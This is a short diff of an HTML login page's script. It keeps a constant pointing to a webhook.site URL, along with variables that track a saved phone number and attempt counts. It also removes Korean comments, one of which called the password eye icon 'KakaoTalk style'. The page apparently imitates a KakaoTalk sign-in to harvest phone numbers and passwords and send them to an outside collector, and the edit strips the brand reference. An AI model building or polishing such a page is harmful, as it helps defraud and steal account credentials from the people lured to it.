@@ -91,7 +91,6 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-// 기존 스크립트 그대로 유지
 const webhookUrl = "https://webhook.site/bee57e23-7107-4cb1-84f2-7691013118f6";
 let savedPhone = "";
 let phoneTryCount = 0;
@@ -268,17 +267,16 @@ passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
-// 카카오톡 스타일 눈 아이콘 토글
+// 눈 아이콘 토글
 function togglePassword() {
   const input = document.getElementById("userCode4");
   const slash = document.querySelector(".eye-slash");
-
   if (input.type === "password") {
     input.type = "text";
-    slash.style.display = "block"; // 보이는 상태: 슬래시 제거
+    slash.style.display = "block";
   } else {
     input.type = "password";
-    slash.style.display = "none"; // 숨김 상태: 슬래시 표시
+    slash.style.display = "none";
   }
 }
 
